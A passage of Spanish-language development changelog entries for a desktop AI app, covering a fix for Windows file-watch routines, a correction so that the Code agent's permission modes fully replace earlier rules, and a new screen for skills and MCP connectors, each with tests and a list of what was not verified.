- **Pruebas**: `import-sources.test.ts` (saneado, secretos falsos armados en tiempo de ejecución que NO deben aparecer en ninguna salida, rutas/symlinks/tamaño), `import-service.test.ts` (vista previa sin escritura, aplicar solo lo marcado, ficha caducada/ajena, archivo cambiado, nombre que aparece, esquemas IPC y clase X), `ImportSection.test.tsx` (componente), escenario `ajustes-importar`.
- **No verificado**: archivos TOML (p. ej. configuraciones de otras herramientas en TOML) no se leen; no se resuelven variables `${VAR}` del origen (solo se referencian por nombre); Windows real.

## F8-B178 — Rutinas por archivo en Windows: la carpeta vigilada se valida sin aprobarla antes en Tareas

- **Síntoma** (Windows real, 0.5.37): `routines:save` con un disparador por archivo (modo Chat) respondía «No se pudo comprobar la política de carpetas de Windows…» hasta que la carpeta se aprobaba antes con `tasks:approveFolder`; aun guardada, la tarjeta decía «Carpeta no disponible».
- **Causa raíz**: `SchedulerService.fileFolderProblem` llama a `TasksManager.folderForbidden`, que es síncrono y usa `WinHost.context()`. Ese contexto es `undefined` (la política falla cerrado con `merr.folder.winContext`) si las unidades no se leyeron en los últimos 120 s (`WIN_CONTEXT_MAX_AGE_MS`), y la única que las releía (`refresh()`) era `tasks:approveFolder`. Ni `routines:save`, ni el arranque, ni el tick de 30 s lo hacían: tras aprobar la carpeta funcionaba 2 minutos; luego `FileWatchManager.sync` veía un problema, cerraba el vigilante y lo dejaba `lost` («Carpeta no disponible»). No era `fs.watch` ni `isSameOrInside`.
- **Arreglo** (general, sin tocar `folder-policy*`, `win-context.ts` ni el sandbox): `RoutineTasksPort.refreshPolicy?()` (el gestor ya la tenía) se espera antes de validar en `routines:save`, `routines:toggle` (al activar), `start()` y cada `tick()` del planificador (solo con rutinas por archivo activas). `TasksManager.folderForbidden` usa comprobación de enlaces superficial (ancestros y la propia carpeta; el disparador no es recursivo y ya ignora enlaces; evita recorrer hasta 50 000 entradas en cada tick). `watchFolderReason` clasifica `//servidor/…` como red. El planificador acepta `platform`, `homeDir` y un `FsLike.isDirectory` inyectados (pruebas con rutas de Windows).
- **Seguridad**: sin cambios de política; sigue rechazando raíz de unidad, carpeta personal completa, `AppData`/datos de la app, UNC y rutas de dispositivo, `..`, unidades de red/extraíbles, otros usuarios y enlaces/junctions que salgan; Tareas/Code siguen exigiendo la carpeta de la rutina. `docs/SEGURIDAD.md` («Disparador por archivo de las Rutinas»).
- **Pruebas**: `src/main/scheduler/service.win.test.ts` (reproduce el síntoma sin releer; tabla de 8 carpetas aceptadas y 25 rechazadas con rutas de Windows; enlaces/junction; Tareas/Code; caducidad y arranque; guardar → vigilar → 1 archivo = 1 ejecución, 5 = 1 agrupada); `file-trigger` sin cambios de comportamiento.
- **Segunda causa del «Carpeta no disponible» (UI)**: con el aviso de términos sin aceptar (o rutinas bloqueadas por política) el vigilante queda en estado `off` y `RoutinesView` lo pintaba con el texto de `lost`. Ahora `off` dice «Sin vigilar: falta aceptar el aviso de Rutinas» (`routines.file.state.off`, es/en) y «Carpeta no disponible» queda solo para un vigilante realmente perdido.
- **Windows real (PC de pruebas, instalador de esta rama, perfil aislado con `--user-data-dir` y XDG temporales, CDP)**: `routines:save` en modo Chat con `C:\Users\Bentec\lazunox-watch-prueba` responde OK SIN aprobar nada en Tareas (`tasks:listFolders` = `[]` antes y después); rechazadas con mensaje claro `C:\`, `C:/`, `C:\Users\Bentec`, `C:\Users`, `//servidor/recurso`, `C:\Windows\System32`, `AppData\Roaming`, `..`; `\\servidor\…`, `\\?\…` y relativas las rechaza antes el esquema IPC («debe ser una ruta absoluta»). Sin aceptar el aviso: «Sin vigilar: falta aceptar el aviso de Rutinas»; aceptado (solo en el perfil temporal): «Vigilando la carpeta». Un archivo → UNA ejecución y un resultado en «Resultados por revisar»; cinco a la vez → UNA ejecución agrupada (sin bucles); tras 5 min (la política ya habría caducado) sigue «Vigilando» y un archivo tardío dispara. Capturas en `~/Documents/lazunox-capturas/rutinas-windows/`.
- **No verificado**: carpetas en OneDrive reales con «archivos a petición», unidades de red/extraíbles reales, copias lentas con bloqueo de archivo, `C:\Users\Bentec` con otra configuración regional; rutina en modo Tareas/Code en Windows real (solo con rutas inyectadas).

## F8-B179 — Modos de permisos de Code: cada modo reemplaza de verdad las reglas y dice lo que hace

- **Qué pasaba**: el motor suma las reglas de `session.update` y gana la última que coincide, así que cambiar de modo en una sesión ya creada dejaba vigentes los `ask` del modo anterior («Preguntar siempre» → «Automático» seguía preguntando `ls`, `echo…`, tuberías); la comparación `sameRuleset` nunca igualaba y las reglas se reenviaban en cada mensaje (la lista crecía 14→38); «Editar sin preguntar» no preguntaba por comandos aunque su texto lo dijera; «Solo explorar» dejaba `bash` permitido y, con otro modo previo, hasta `edit`; «Preguntar siempre» no cubría subagentes; Comparar duplicaba las reglas y bajaba «Todo sin preguntar» a Automático.
- **Qué cambia**: bloque autosuficiente por modo en `src/shared/permission-rules.ts` (fija cada permiso gestionado con `*` y luego sus excepciones), reenvío solo si la sesión no termina ya con el bloque, el agente Plan manda sobre el modo, «Solo explorar» y «Editar sin preguntar» hacen verdad su texto, «Preguntar siempre» pregunta al lanzar un subagente, «Automático» = ediciones y lectura + comandos de solo lectura y pruebas aprobados por la app tras comprobar el comando completo (el motor evalúa las partes de una orden compuesta sin su redirección), todo lo demás pregunta. Textos corregidos (es/en), nota «lo que siempre pregunta» al pie del menú del chip y aviso «El cambio vale desde el próximo mensaje» si hay una tarea corriendo. Comparar usa los mismos bloques y no rebaja «Todo sin preguntar». Overdrive y Chat no cambian.
- **Seguridad**: `docs/SEGURIDAD.md` §3 quinquagies quater. No se abre nada que antes no pasara sin preguntar salvo los comandos de solo lectura listados en «Automático» y «Solo explorar» (aprobación comprobada por la app).
- **Pruebas**: `src/shared/permission-rules.test.ts` (simulador del motor: sesión cambiada equivale a sesión nueva para todas las parejas de modos, tabla modo × permiso, idempotencia, comandos permitidos y rechazados), `store.permisos.test.ts` (reemplazo, no reenvío, agente Plan, aprobación automática), Comparar (`service.test.ts`), guardias de lenguaje llano; y la corrida en el motor real y en la app real de `docs/estudio-competencia/permisos-arreglo.md`.
- **No verificado**: conectores externos (MCP) reales; Windows real (los comandos de PowerShell solo por pruebas unitarias); ventana cerrada con un comando pendiente (el motor espera).

## F8-B180 — Personalización: habilidades y conectores en una pantalla

- **Qué es**: pantalla «Personalización» (ítem en el grupo de abajo de la barra lateral y en la paleta) con pestañas Habilidades / Conectores / Tuyos, buscador, tarjetas con etiqueta de estado, detalle de cada ficha (qué hace, permisos, ejemplos, «Quitar»), paso a paso para conectar en lenguaje llano y estados cargando / error / vacío. Maquetas aprobadas en `mockup/personalizacion-galeria`.
- **Catálogo**: un JSON versionado dentro de la app (`resources/catalogo/catalogo.json` + esquema + validador `src/shared/catalogo.ts`), sin servidor ni cuentas; `docs/CATALOGO.md` explica cómo proponer una ficha por pull request. v1 ofrece las 7 fichas ya verificadas del catálogo MCP de Ajustes, reorganizadas por tareas de la vida real (grupos vacíos ocultos), y las habilidades incluidas. Sello «Revisado por Lazunox» solo en el catálogo empaquetado.
- **Habilidades**: interruptor para las incluidas (aplica a conversaciones nuevas) e instalación de una propia solo desde una carpeta elegida con el diálogo nativo (validación estricta, vista previa y confirmación, nada se ejecuta ni se descarga). Canales nuevos `personalizacion:skills:*`, clase X.
- **Conectores**: la lógica de alta/baja/estado de MCP se compartió con Ajustes › Conectores (`useMcpConnections`, `src/shared/mcp-catalog.ts`); ambas pantallas se enlazan.
- **Seguridad**: `docs/SEGURIDAD.md` §3 quinquagies quinquies.
- **Pruebas**: `src/test/catalogo.test.ts` (falla si una ficha no cumple el esquema o promete sin verificar), `src/main/personalizacion/personalizacion.test.ts`, `src/main/ipc/personalizacion-ipc.test.ts`, `src/renderer/src/features/personalizacion/*.test.ts(x)`.
- **No verificado**: Windows real; conectores contra servicios reales desde esta pantalla (la verificación de las fichas es la del catálogo de Ajustes).
